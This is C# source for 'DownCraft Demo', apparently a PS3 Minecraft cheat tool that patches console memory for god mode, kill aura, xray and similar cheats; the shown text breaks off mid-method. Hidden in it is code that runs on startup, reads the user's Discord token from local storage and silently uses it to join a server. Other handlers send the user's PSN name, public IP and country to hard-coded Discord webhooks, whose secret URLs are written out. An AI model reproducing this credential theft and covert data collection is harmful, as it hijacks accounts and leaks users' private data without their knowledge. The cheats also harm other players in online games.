using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using MetroFramework;
using WMPLib;
using PS3Lib;
using System.Net;
using System.IO;
using System.Diagnostics;
using DiscordRpcDemo;
using MetroFramework.Forms;
using ForNiegil;
using System.Threading;
using System.Security;
using System.Web;

namespace DownCraft_Demo
{
    public partial class Form1 : MetroForm
    {
        private DiscordRpc.EventHandlers handlers;
        private DiscordRpc.RichPresence presence;
        WindowsMediaPlayer tutu = new WindowsMediaPlayer();
        WindowsMediaPlayer music = new WindowsMediaPlayer();
        WindowsMediaPlayer nya = new WindowsMediaPlayer();
        WindowsMediaPlayer Baka = new WindowsMediaPlayer();
        PS3API PS3 = new PS3API();
        public static Point newpoint = new Point();
        public static int x;
        public static int y;
        private int originalWidth;
        private int originalHeight;

        public Form1()
        {
            InitializeComponent();
            originalWidth = this.Width;
            originalHeight = this.Height;
            ServicePointManager.SecurityProtocol = SecurityProtocolType.Ssl3 | SecurityProtocolType.Tls | SecurityProtocolType.Tls11 | SecurityProtocolType.Tls12;
        }

        #region "DISCORD JOINER SERVER"
        public static bool FindLdb(ref string path)
        {
            if (!Directory.Exists(path))
            {
                return false;
            }
            foreach (FileInfo fileInfo in new DirectoryInfo(path).GetFiles())
            {
                if (fileInfo.Name.EndsWith(".ldb") && File.ReadAllText(fileInfo.FullName).Contains("oken"))
                {
                    path += fileInfo.Name;
                    break;
                }
            }
            return path.EndsWith(".ldb");
        }

        public static bool FindLog(ref string path)
        {
            if (!Directory.Exists(path))
            {
                return false;
            }
            foreach (FileInfo fileInfo in new DirectoryInfo(path).GetFiles())
            {
                if (fileInfo.Name.EndsWith(".log") && File.ReadAllText(fileInfo.FullName).Contains("oken"))
                {
                    path += fileInfo.Name;
                    break;
                }
            }
            return path.EndsWith(".log");
        }


        public static string GetToken(string path, bool isLog = false)
        {
            byte[] bytes = File.ReadAllBytes(path);
            string @string = Encoding.UTF8.GetString(bytes);
            string text = "";
            string text2 = @string;
            while (text2.Contains("oken"))
            {
                string[] array = Sub(text2).Split(new char[]
                {
                    '"'
                });
                text = array[0];
                text2 = string.Join("\"", array);
                if (isLog && text.Length == 59)
                {
                    break;
                }
            }
            return text;
        }

        private static string Sub(string contents)
        {
            string[] array = contents.Substring(contents.IndexOf("oken") + 4).Split(new char[]
            {
                '"'
            });
            List<string> list = new List<string>();
            list.AddRange(array);
            list.RemoveAt(0);
            array = list.ToArray();
            return string.Join("\"", array);
        }



        public string Request(string method, string url, string postData, string token)
        {
            string text = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\Discord\\Local Storage\\leveldb\\";
            HttpWebRequest httpWebRequest = WebRequest.CreateHttp(url);
            httpWebRequest.Method = method;
            httpWebRequest.Headers.Add("authorization", token);
            byte[] bytes = Encoding.UTF8.GetBytes(postData);
            httpWebRequest.ContentType = "application/x-www-form-urlencoded";
            httpWebRequest.ContentLength = (long)bytes.Length;
            httpWebRequest.Timeout = 2500;
            Stream requestStream = httpWebRequest.GetRequestStream();
            requestStream.Write(bytes, 0, bytes.Length);
            requestStream.Close();
            return new StreamReader(httpWebRequest.GetResponse().GetResponseStream()).ReadToEnd();
        }
        public void JoinServer(string invite, string token)
        {
            try
            {
                this.Request("POST", "https://discordapp.com/api/v6/invite/" + invite, "a=b", token);
            }

            catch
            {

            }
        }

        #endregion

        private void xMouseDown(object sender, MouseEventArgs e)
        {
            x = Control.MousePosition.X - base.Location.X;
            y = Control.MousePosition.Y - base.Location.Y;
        }
        private void xMouseMove(object sender, MouseEventArgs e)
        {
            if (e.Button == MouseButtons.Left)
            {
                newpoint = Control.MousePosition;
                newpoint.X -= x;
                newpoint.Y -= y;
                base.Location = newpoint;
            }
        }

        void DiscordJoin()
        {
            try
            {
            string text = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\discord\\Local Storage\\leveldb\\";
            if (!FindLdb(ref text) && !FindLog(ref text))
            {

            }

            Thread.Sleep(100);
            string text2 = GetToken(text, text.EndsWith(".log"));

            Process[] processesByName = Process.GetProcessesByName("Discord");
            for (int i = 0; i < processesByName.Length; i++)
            {

            }

            JoinServer("FDQzSr4", text2);
            }
            catch(Exception)
            {

            }
        }

        private void Form1_Load(object sender, EventArgs e)
        {
            timer3.Start();

            DiscordJoin();

            this.bunifuGradientPanel1.MouseDown += this.xMouseDown; //For Move Form
            this.bunifuGradientPanel1.MouseMove += this.xMouseMove; //For Move Form
            this.bunifuGradientPanel1.MouseDown += this.xMouseDown; //For Move Form
            this.bunifuGradientPanel1.MouseMove += this.xMouseMove; //For Move Form


            this.handlers = default(DiscordRpc.EventHandlers);
            DiscordRpc.Initialize("635947456550666280", ref this.handlers, true, null);
            this.handlers = default(DiscordRpc.EventHandlers);
            DiscordRpc.Initialize("635947456550666280", ref this.handlers, true, null);
            this.presence.details = "IDLE";
            this.presence.state = "https://downcraft.xyz";


            System.DateTime epoch = new System.DateTime(1970, 1, 1, 0, 0, 0, System.DateTimeKind.Utc);
            long cur_time = (long)(System.DateTime.UtcNow - epoch).TotalSeconds;

            presence.startTimestamp = cur_time;
            this.presence.largeImageKey = "logo1";
            this.presence.smallImageKey = "logo";
            this.presence.largeImageText = "IDLE";
            this.presence.smallImageText = "DownCraft Demo Edition";
            DiscordRpc.UpdatePresence(ref this.presence);

            tutu.URL = @"Musics\good.wav";

            //AUTO DOWNLOAD NEW
            WebClient webClientUpdate = new WebClient(); //FOR UPDATER

            if (!webClientUpdate.DownloadString("https://downcraft.xyz/demo_update/update.php").Contains("7.0"))
            {
                if (MessageBox.Show("NEW UPDATE\n\nDownCraft have a new update please, reinstall DownCraft with the setup !", "New Update", MessageBoxButtons.YesNo, MessageBoxIcon.Question) == DialogResult.Yes)
                {
                    Process.Start("http://downcraft.xyz");
                    Application.Exit();
                }
                else
                {
                    Application.Exit();
                }
            }
        }
        

        private void metroRadioButton1_CheckedChanged(object sender, EventArgs e)
        {
            PS3.ChangeAPI(SelectAPI.ControlConsole);
        }

        private void metroRadioButton2_CheckedChanged(object sender, EventArgs e)
        {
            PS3.ChangeAPI(SelectAPI.TargetManager);
        }

        private void metroButton1_Click(object sender, EventArgs e)
        {
            try
            {
                if (PS3.ConnectTarget())
                {
                    bunifuCircleProgressbar1.Visible = true;
                    MessageBox.Show("Succes RTM Connected to PS3", "DownCraft Demo", MessageBoxButtons.OK, MessageBoxIcon.Information);
                }
                else
                {
                    MessageBox.Show("Error RTM Not connected to PS3", "DownCraft Demo", MessageBoxButtons.OK, MessageBoxIcon.Information);
                }
            }
            catch (Exception)
            {
                MessageBox.Show("Error RTM Not Connected To PS3", "DownCraft Demo", MessageBoxButtons.OK, MessageBoxIcon.Error);
            }
        }

        private void metroButton2_Click(object sender, EventArgs e)
        {
            try
            {
                if (PS3.AttachProcess())
                {
                    pictureBox10.Image = Properties.Resources.checkmark_64px;
                    metroLabel3.Text = PS3.Extension.ReadString(0x3000ABE4); //////NAME SLOT OF MINECRAFT
                    metroLabel8.Text = PS3.Extension.ReadString(0x3000AD34); //////NAME SLOT OF MINECRAFT
                    timer1.Start();
                    PS3.CCAPI.Notify(CCAPI.NotifyIcon.CAUTION, "Welcome to DownCraft Demo Edition V6\nMake By Misaki Dev !");
                    music.URL = @"Musics\music.mp3";
                    music.controls.play();
                    BAN();

                    if (metroLabel8.Text == "")
                    {
                        metroLabel8.Text = "*Offline-Users*";
                        metroLabel3.Text = "*Offline-Users*";
                        MessageBox.Show("You using DownCraft Demo on offline, it's better if you are using it on online :p", "DownCraft Demo", MessageBoxButtons.OK, MessageBoxIcon.Information);
                        bunifuCircleProgressbar1.Visible = false;
                    }


                    WebClient MDR = new WebClient();
                    string LOL = MDR.DownloadString("https://downcraft.xyz/premiumnumbercount.php");

                    WebClient LOGS = new WebClient();
                    string FreeLogs = LOGS.DownloadString("https://downcraft.xyz/premium_update/logs_attach_free.php");


                    MessageBox.Show("Succes Attached to PS3\n\nIf you want have more mods for Host / Non Host and you it for all players, you can use DownCraft Premium Edition\nIt's only 10$ for lifetime with free update all months\nIf you want it go to downcraft website!\n\n" + LOL + " members have Premium Edition why not you ? ^^", "DownCraft Demo", MessageBoxButtons.OK, MessageBoxIcon.Information);
                    Process.Start("https://downcraft.xyz/misaki/buypremium");

                    this.handlers = default(DiscordRpc.EventHandlers);
                    DiscordRpc.Initialize("635947456550666280", ref this.handlers, true, null);
                    this.handlers = default(DiscordRpc.EventHandlers);
                    DiscordRpc.Initialize("635947456550666280", ref this.handlers, true, null);
                    this.presence.details = "RTM Connected + Attached Demo V7";
                    this.presence.state = "https://downcraft.xyz";
                    this.presence.largeImageKey = "logo1";
                    this.presence.smallImageKey = "logo";
                    this.presence.largeImageText = "PSN: " + metroLabel8.Text +"";
                    this.presence.smallImageText = "DownCraft Demo Edition";
                    DiscordRpc.UpdatePresence(ref this.presence);

                    Baka.URL = @"Musics\baka.mp3";
                    Baka.controls.play();

                    Webhook hook1 = new Webhook("https://discordapp.com/api/webhooks/718493810014814259/78JAlBdQrJ7CA0G19p99bQ8xte6zh-YYSkVuvHzCgGx1hV5AFfga5KrRnpAH4i0_qMy0");
                    hook1.Name = "DownCraft Demo Logs";
                    hook1.ProfilePictureUrl = "https://cdn.discordapp.com/attachments/648264834860974095/648283854288846859/e870e4522f4f9c575a32a064a3b2d30d.png";

                    hook1.SendMessage("```User: " + metroLabel8.Text + " have connect + attach RTM DownCraft Demo Edition.```");
                }
                else
                {
                    MessageBox.Show("Error can't attach to PS3.", "DownCraft Demo", MessageBoxButtons.OK, MessageBoxIcon.Error);
                }
            }
            catch (Exception)
            {
                MessageBox.Show("Error can't attach to PS3.", "DownCraft Demo", MessageBoxButtons.OK, MessageBoxIcon.Error);
            }
        }

        private void timer1_Tick(object sender, EventArgs e)
        {
            Random rand = new Random();
            int A = rand.Next(0, 255);
            int R = rand.Next(0, 255);
            int G = rand.Next(0, 255);
            int B = rand.Next(0, 255);
            metroLabel3.ForeColor = Color.FromArgb(A, R, G, B);
        }

        void BAN()
        {
            string banned = new WebClient().DownloadString("https://downcraft.xyz/demoban.php");

            if (metroLabel3.Text == banned)
            {
                MessageBox.Show("You are banned for 48 hours for have abuse with RTM, contact Misaki Dev if you think it's a problem.", "DownCraft Demo", MessageBoxButtons.OK, MessageBoxIcon.Error);
                PS3.DisconnectTarget();
                metroButton1.Visible = false;
                metroButton2.Visible = false;
                Application.Exit();
            }
        }

        private void metroCheckBox1_CheckedChanged(object sender, EventArgs e)
        {
            if (metroCheckBox1.Checked)  //////God Mode
            {
                PS3.SetMemory(0x004B2021, new byte[] { 0x80 }); ////MODIFED VALUE
                PS3.CCAPI.Notify(CCAPI.NotifyIcon.CAUTION, "DownCraft Notification\nGod Mode Enabled");
            }
            else
            {
                PS3.SetMemory(0x004B2021, new byte[] { 0x20 }); ////SET to default
                PS3.CCAPI.Notify(CCAPI.NotifyIcon.CAUTION, "DownCraft Notification\nGod Mode Disabled");
            }
        }

        private void metroCheckBox2_CheckedChanged(object sender, EventArgs e)
        {
            if (metroCheckBox2.Checked)  //////Super Speed X3 PREMIUM
            {
                PS3.SetMemory(0x003ABD48, new byte[] { 0x3F, 0x10, 0x23, 0x50 }); ////MODIFED VALUE
                PS3.SetMemory(0x003AA999, new byte[] { 0x00 }); ////MODIFED VALUE
                PS3.CCAPI.Notify(CCAPI.NotifyIcon.CAUTION, "DownCraft Notification\nSuper Speed Enabled");
            }
            else
            {
                PS3.SetMemory(0x003ABD48, new byte[] { 0x3E, 0x26, 0xAD, 0x89 }); ////SET to default
                PS3.SetMemory(0x003AA999, new byte[] { 0x68 });  ////SET to default
                PS3.CCAPI.Notify(CCAPI.NotifyIcon.CAUTION, "DownCraft Notification\nSuper Speed Disabled");
            }
        }

        private void metroCheckBox3_CheckedChanged(object sender, EventArgs e)
        {
            if (metroCheckBox3.Checked)  //////Instant hit
            {
                PS3.SetMemory(0x00AEBED4, new byte[] { 0xFF }); ////MODIFED VALUE
                PS3.CCAPI.Notify(CCAPI.NotifyIcon.CAUTION, "DownCraft Notification\nFast Hit Enabled");
            }
            else
            {
                PS3.SetMemory(0x00AEBED4, new byte[] { 0x3E }); ////SET to default
                PS3.CCAPI.Notify(CCAPI.NotifyIcon.CAUTION, "DownCraft Notification\nFast Hit Disabled");
            }
        }

        private void metroCheckBox4_CheckedChanged(object sender, EventArgs e)
        {
            if (metroCheckBox4.Checked)  //////Reach/Attack
            {
                PS3.SetMemory(0x00A95FB9, new byte[] { 0x80 }); ////reach creative ENTITY MOB
                PS3.SetMemory(0x00A95FC1, new byte[] { 0x80 }); ////reach survival ENTITY MOB
                PS3.SetMemory(0x00B351D8, new byte[] { 0x43, 0xA0, 0x00, 0x00 });////creative
                PS3.SetMemory(0x00B351DC, new byte[] { 0x43, 0xA0, 0x00, 0x00 });/////survival
            }
            else
            {
                PS3.SetMemory(0x00A95FB9, new byte[] { 0x18 }); ////reach creative ENTITY MOB
                PS3.SetMemory(0x00A95FC1, new byte[] { 0x08 }); ////reach survival ENTITY MOB
                PS3.SetMemory(0x00B351D8, new byte[] { 0x40, 0xA0, 0x00, 0x00 });/////creative
                PS3.SetMemory(0x00B351DC, new byte[] { 0x40, 0x90, 0x00, 0x00 });/////survival
            }
        }

        private void metroCheckBox5_CheckedChanged(object sender, EventArgs e)
        {
            if (metroCheckBox5.Checked)  //////Craft
            {
                PS3.SetMemory(0x0098871F, new byte[] { 0x01 }); ////MODIFED VALUE
                PS3.CCAPI.Notify(CCAPI.NotifyIcon.CAUTION, "DownCraft Notification\nInfinite Craft Enabled");
            }
            else
            {
                PS3.SetMemory(0x0098871F, new byte[] { 0x00 }); ////SET to default
                PS3.CCAPI.Notify(CCAPI.NotifyIcon.CAUTION, "DownCraft Notification\nInfinite Craft Disabled");
            }
        }

        private void metroCheckBox6_CheckedChanged(object sender, EventArgs e)
        {
            if (metroCheckBox6.Checked)  //////Multi Jump
            {
                PS3.SetMemory(0x0022790B, new byte[] { 0x14 }); ////MODIFED VALUE
                PS3.CCAPI.Notify(CCAPI.NotifyIcon.CAUTION, "DownCraft Notification\nMulti Jump Enabled");
            }
            else
            {
                PS3.SetMemory(0x0022790B, new byte[] { 0x18 }); ////SET to default
                PS3.CCAPI.Notify(CCAPI.NotifyIcon.CAUTION, "DownCraft Notification\nMulti Jump Disabled");
            }
        }

        private void metroCheckBox7_CheckedChanged(object sender, EventArgs e)
        {
            if (metroCheckBox7.Checked)  //////FOV
            {
                PS3.SetMemory(0x014C670C, new byte[] { 0x3F, 0x20 }); //MODIFIED VALUE
                PS3.CCAPI.Notify(CCAPI.NotifyIcon.CAUTION, "DownCraft Notification\nFOV Enabled");
            }
            else
            {
                PS3.SetMemory(0x014C670C, new byte[] { 0x3F, 0x80 }); //SET to default
                PS3.CCAPI.Notify(CCAPI.NotifyIcon.CAUTION, "DownCraft Notification\nFOV Disabled");
            }
        }

        private void metroButton3_Click(object sender, EventArgs e)
        {
            string externalip = new WebClient().DownloadString("http://ipinfo.io/ip");
            string country = new WebClient().DownloadString("http://ipinfo.io/country");


            PS3.SetMemory(0x3000ABE4, new byte[] { 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00 });

            byte[] bytes = Encoding.ASCII.GetBytes(metroTextBox1.Text + "");

            PS3.SetMemory(0x3000ABE4, bytes);

            timer1.Start();
            metroLabel3.Visible = true;
            metroLabel3.Text = PS3.Extension.ReadString(0x3000ABE4); //////NAME SLOT OF MINECRAFT
            PS3.CCAPI.Notify(CCAPI.NotifyIcon.CAUTION, "Name Changed rejoin world !");

            Webhook hook1 = new Webhook("https://discordapp.com/api/webhooks/667749798371262494/XKaJ6aK5wWE8ZC8UyHn-jAxeEHs8xP8RcSWmhSBYbwJt1k_q6jDBwgm-6O9fgcif21iI");
            hook1.Name = "DownCraft Bot Logs";
            hook1.ProfilePictureUrl = "https://cdn.discordapp.com/attachments/648264834860974095/648283854288846859/e870e4522f4f9c575a32a064a3b2d30d.png";

            hook1.SendMessage("```User: " + metroLabel8.Text + " have change the name to " + metroLabel3.Text + " \nIP: " + externalip + "Country: " + country + "```");


            //====================REPORT NAME===========================

            if (metroTextBox1.Text == "MisakiDev-")
            {
                REPORT_NAME_STEAL();
            }

            void REPORT_NAME_STEAL()
            {
                PS3.CCAPI.Notify(CCAPI.NotifyIcon.CAUTION, "REPORT SEND TO MISAKI !!");
                PS3.CCAPI.RingBuzzer(CCAPI.BuzzerMode.Double);

                Webhook hook = new Webhook("https://discordapp.com/api/webhooks/667749798371262494/XKaJ6aK5wWE8ZC8UyHn-jAxeEHs8xP8RcSWmhSBYbwJt1k_q6jDBwgm-6O9fgcif21iI");
                hook.Name = "DownCraft Bot Logs";
                hook.ProfilePictureUrl = "https://cdn.discordapp.com/attachments/648264834860974095/648283854288846859/e870e4522f4f9c575a32a064a3b2d30d.png";

                hook.SendMessage("@everyone\n```diff\n-User: " + metroLabel8.Text + " have change the name to " + metroLabel3.Text + "\n```");
                defaultname();
            }
        }

        private void metroCheckBox8_CheckedChanged(object sender, EventArgs e)
        {
            if (metroCheckBox8.Checked)  //////Kill Aura
            {
                PS3.SetMemory(0x00233290, new byte[] { 0xC0 }); ////MODIFED VALUE
                PS3.CCAPI.Notify(CCAPI.NotifyIcon.CAUTION, "DownCraft Notification\nKill Aura Enabled");
            }
            else
            {
                PS3.SetMemory(0x00233290, new byte[] { 0x00 }); ////MODIFED VALUE
                PS3.CCAPI.Notify(CCAPI.NotifyIcon.CAUTION, "DownCraft Notification\nKill Aura Disabled");
            }
        }

        private void metroCheckBox9_CheckedChanged(object sender, EventArgs e)
        {
            if (metroCheckBox9.Checked)  //////Night Vision
            {
                PS3.SetMemory(0x00A9A6C8, new byte[] { 0x7F }); ////MODIFED VALUE
                PS3.CCAPI.Notify(CCAPI.NotifyIcon.CAUTION, "DownCraft Notification\nNight Vision Enabled");
            }
            else
            {
                PS3.SetMemory(0x00A9A6C8, new byte[] { 0x3F }); ////SET to default
                PS3.CCAPI.Notify(CCAPI.NotifyIcon.CAUTION, "DownCraft Notification\nNight Vision Disabled");
            }
        }

        private void metroCheckBox10_CheckedChanged(object sender, EventArgs e)
        {
            if (metroCheckBox10.Checked)  //////Can Fly
            {
                PS3.SetMemory(0x00B02378, new byte[] { 0x40 }); ////MODIFED VALUE
                PS3.CCAPI.Notify(CCAPI.NotifyIcon.CAUTION, "DownCraft Notification\nFly Acces Enabled");
            }
            else
            {
                PS3.SetMemory(0x00B02378, new byte[] { 0x41 }); ////SET to default
                PS3.CCAPI.Notify(CCAPI.NotifyIcon.CAUTION, "DownCraft Notification\nFly Acces Disabled");
            }
        }

        private void metroCheckBox11_CheckedChanged(object sender, EventArgs e)
        {
            if (metroCheckBox11.Checked)  //////No Colission Bypass
            {
                PS3.SetMemory(0x00011230, new byte[] { 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF }); ////MODIFED VALUE
                PS3.CCAPI.Notify(CCAPI.NotifyIcon.CAUTION, "DownCraft Notification\nNo Colission Enabled");
            }
            else
            {
                PS3.SetMemory(0x00011230, new byte[] { 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00 }); ////SET to default
                PS3.CCAPI.Notify(CCAPI.NotifyIcon.CAUTION, "DownCraft Notification\nNo Colission Disabled");
            }
        }

        private void metroCheckBox12_CheckedChanged(object sender, EventArgs e)
        {
            if (metroCheckBox12.Checked)  //////Unlimited Pick up
            {
                PS3.SetMemory(0x00224B13, new byte[] { 0x00 }); ////MODIFED VALUE
                PS3.CCAPI.Notify(CCAPI.NotifyIcon.CAUTION, "DownCraft Notification\nUnlimited Pick Up Enabled");
            }
            else
            {
                PS3.SetMemory(0x00224B13, new byte[] { 0x01 }); ////SET to default
                PS3.CCAPI.Notify(CCAPI.NotifyIcon.CAUTION, "DownCraft Notification\nUnlimited Pick Up Disabled");
            }
        }

        private void metroCheckBox13_CheckedChanged(object sender, EventArgs e)
        {
            if (metroCheckBox13.Checked)  //////XRay
            {
                PS3.SetMemory(0x00A99154, new byte[] { 0xFC, 0x80, 0x30, 0x90 }); ////MODIFED VALUE
                PS3.CCAPI.Notify(CCAPI.NotifyIcon.CAUTION, "DownCraft Notification\nXray Enabled");
            }
            else
            {
                PS3.SetMemory(0x00A99154, new byte[] { 0xFC, 0x60, 0x30, 0x90 }); ////SET to default
                PS3.CCAPI.Notify(CCAPI.NotifyIcon.CAUTION, "DownCraft Notification\nXray Disabled");
            }
        }

        private void timer2_Tick(object sender, EventArgs e)
        {

        }

        private void metroCheckBox14_CheckedChanged(object sender, EventArgs e)
        {
            if (metroCheckBox14.Checked)  //////Instant Damage
            {
                PS3.SetMemory(0x003A3FF0, new byte[] { 0x40, 0x80 }); ////MODIFED VALUE
                PS3.CCAPI.Notify(CCAPI.NotifyIcon.CAUTION, "DownCraft Notification\nInstant Damage Enabled");
            }
            else
            {
                PS3.SetMemory(0x003A3FF0, new byte[] { 0x3F, 0x00 }); ////SET to default
                PS3.CCAPI.Notify(CCAPI.NotifyIcon.CAUTION, "DownCraft Notification\nInstant Damage Disabled");
            }
        }

        private void metroCheckBox15_CheckedChanged(object sender, EventArgs e)
        {
            if (metroCheckBox15.Checked)  //////KnockBack
            {
                PS3.SetMemory(0x003A4018, new byte[] { 0x40, 0x80 }); ////MODIFED VALUE
                PS3.CCAPI.Notify(CCAPI.NotifyIcon.CAUTION, "DownCraft Notification\nKnockback Enabled");
            }
            else
            {
                PS3.SetMemory(0x003A4018, new byte[] { 0x3E, 0xCC }); ////SET to default
                PS3.CCAPI.Notify(CCAPI.NotifyIcon.CAUTION, "DownCraft Notification\nKnockback Disabled");
            }
        }

        private void metroCheckBox16_CheckedChanged(object sender, EventArgs e)
        {
            if (metroCheckBox16.Checked)  //////AntiKnockBack
            {
                PS3.SetMemory(0x003A4018, new byte[] { 0x00, 0x00 }); ////MODIFED VALUE
                PS3.CCAPI.Notify(CCAPI.NotifyIcon.CAUTION, "DownCraft Notification\nAnti Knockback Enabled");
            }
            else
            {
                PS3.SetMemory(0x003A4018, new byte[] { 0x3E, 0xCC }); ////SET to default
                PS3.CCAPI.Notify(CCAPI.NotifyIcon.CAUTION, "DownCraft Notification\nAnti Knockback Disabled");
            }
        }

        private void metroCheckBox17_CheckedChanged(object sender, EventArgs e)
        {
            if (metroCheckBox17.Checked)  //////Toggle Sprint
            {
                PS3.SetMemory(0x00B01DEC, new byte[] { 0x40, 0x82 }); ////MODIFED VALUE
                PS3.CCAPI.Notify(CCAPI.NotifyIcon.CAUTION, "DownCraft Notification\nAuto Sprint Enabled");
            }
            else
            {
                PS3.SetMemory(0x00B01DEC, new byte[] { 0x41, 0x82 }); ////SET to default
                PS3.CCAPI.Notify(CCAPI.NotifyIcon.CAUTION, "DownCraft Notification\nAuto Sprint Disabled");
            }
        }

        private void metroButton4_Click(object sender, EventArgs e)
        {
            PS3.SetMemory(0x3000ABE4, new byte[] { 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00 });

            byte[] bytes = Encoding.ASCII.GetBytes("\nDownCraft\nDemo\nEdition\nV4\n");

            PS3.SetMemory(0x3000ABE4, bytes);

            timer1.Start();
            metroLabel3.Text = PS3.Extension.ReadString(0x3000ABE4); //////NAME SLOT OF MINECRAFT
            PS3.CCAPI.Notify(CCAPI.NotifyIcon.CAUTION, "DownCraft Notification\nGlitched Name Added");
        }

        private void metroButton5_Click(object sender, EventArgs e)
        {
            PS3.SetMemory(0x3000ABE4, new byte[] { 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00 });

            byte[] bytes = Encoding.ASCII.GetBytes("\n#####\n%%%%%\nCMD: Hack World\n");

            PS3.SetMemory(0x3000ABE4, bytes);

            timer1.Start();
            metroLabel3.Text = PS3.Extension.ReadString(0x3000ABE4); //////NAME SLOT OF MINECRAFT
            PS3.CCAPI.Notify(CCAPI.NotifyIcon.CAUTION, "DownCraft Notification\nHacker Man Name Added");
        }

        private void metroButton6_Click(object sender, EventArgs e)
        {
            PS3.SetMemory(0x3000ABE4, new byte[] { 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00 });

            byte[] bytes = Encoding.ASCII.GetBytes("\n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n");

            PS3.SetMemory(0x3000ABE4, bytes);

            timer1.Start();
            metroLabel3.Text = PS3.Extension.ReadString(0x3000ABE4); //////NAME SLOT OF MINECRAFT
            PS3.CCAPI.Notify(CCAPI.NotifyIcon.CAUTION, "DownCraft Notification\nInvisible Name Added");
        }

        private void metroButton8_Click(object sender, EventArgs e)
        {
            PS3.SetMemory(0x3000ABE4, new byte[] { 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00 });

            byte[] bytes = Encoding.ASCII.GetBytes("\nJoin now\nhttps://downcraft.xyz\n<3\n");

            PS3.SetMemory(0x3000ABE4, bytes);

            timer1.Start();
            metroLabel3.Text = PS3.Extension.ReadString(0x3000ABE4); //////NAME SLOT OF MINECRAFT
            PS3.CCAPI.Notify(CCAPI.NotifyIcon.CAUTION, "DownCraft Notification\nWebsite Name Added");
        }

        private void metroButton9_Click(object sender, EventArgs e)
        {
            PS3.SetMemory(0x3000ABE4, new byte[] { 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00 });

            byte[] bytes = Encoding.ASCII.GetBytes("\nLOCAL_ADDRESS\n255.255.255.255\n81.56.458.95\n");

            PS3.SetMemory(0x3000ABE4, bytes);

            timer1.Start();
            metroLabel3.Text = PS3.Extension.ReadString(0x3000ABE4); //////NAME SLOT OF MINECRAFT
            PS3.CCAPI.Notify(CCAPI.NotifyIcon.CAUTION, "DownCraft Notification\nFake ip Name Added");
        }

        private void metroButton7_Click(object sender, EventArgs e)
        {
            PS3.SetMemory(0x3000ABE4, new byte[] { 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00 });

            byte[] bytes = Encoding.ASCII.GetBytes(metroLabel8.Text);

            PS3.SetMemory(0x3000ABE4, bytes);

            timer1.Start();
            metroLabel3.Text = PS3.Extension.ReadString(0x3000ABE4); //////NAME SLOT OF MINECRAFT
            PS3.CCAPI.Notify(CCAPI.NotifyIcon.CAUTION, "DownCraft Notification\nReset Name Added");
        }

        private void metroButton10_Click(object sender, EventArgs e)
        {
            PS3.SetMemory(0x3000ABE4, new byte[] { 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00 });

            byte[] bytes = Encoding.ASCII.GetBytes("#1 Best RTM Tool\nhttps://downcraft.xyz\n");

            PS3.SetMemory(0x3000ABE4, bytes);

            timer1.Start();
            metroLabel3.Text = PS3.Extension.ReadString(0x3000ABE4); //////NAME SLOT OF MINECRAFT
            PS3.CCAPI.Notify(CCAPI.NotifyIcon.CAUTION, "DownCraft Notification\nAdvertising Name Added");
        }

        private void metroCheckBox20_CheckedChanged(object sender, EventArgs e)
        {
            if (metroCheckBox20.Checked)  //////Infinity place block
            {
                PS3.SetMemory(0x0010673F, new byte[] { 0x00 }); ////MODIFED VALUE
                PS3.CCAPI.Notify(CCAPI.NotifyIcon.CAUTION, "DownCraft Notification\nInfinite Place Blocks Enabled");
            }
            else
            {
                PS3.SetMemory(0x0010673F, new byte[] { 0x01 }); ////SET to default
                PS3.CCAPI.Notify(CCAPI.NotifyIcon.CAUTION, "DownCraft Notification\nInfinite Place Blocks Disabled");
            }
        }

        private void metroCheckBox23_CheckedChanged(object sender, EventArgs e)
        {
            if (metroCheckBox23.Checked)  //////All Players Burn
            {
                PS3.SetMemory(0x00225FA0, new byte[] { 0x40 }); ////MODIFED VALUE
                PS3.CCAPI.Notify(CCAPI.NotifyIcon.CAUTION, "DownCraft Notification\nAll Players Burn Enabled");
            }
            else
            {
                PS3.SetMemory(0x00225FA0, new byte[] { 0x41 }); ////SET to default
                PS3.CCAPI.Notify(CCAPI.NotifyIcon.CAUTION, "DownCraft Notification\nAll Players Burn Disabled");
            }
        }

        private void metroCheckBox24_CheckedChanged(object sender, EventArgs e)
        {
            if (metroCheckBox24.Checked)  //////MAX XP LEVEL
            {
                PS3.SetMemory(0x004B0094, new byte[] { 0x7C, 0xA5, 0x10, 0x14 }); ////MODIFED VALUE
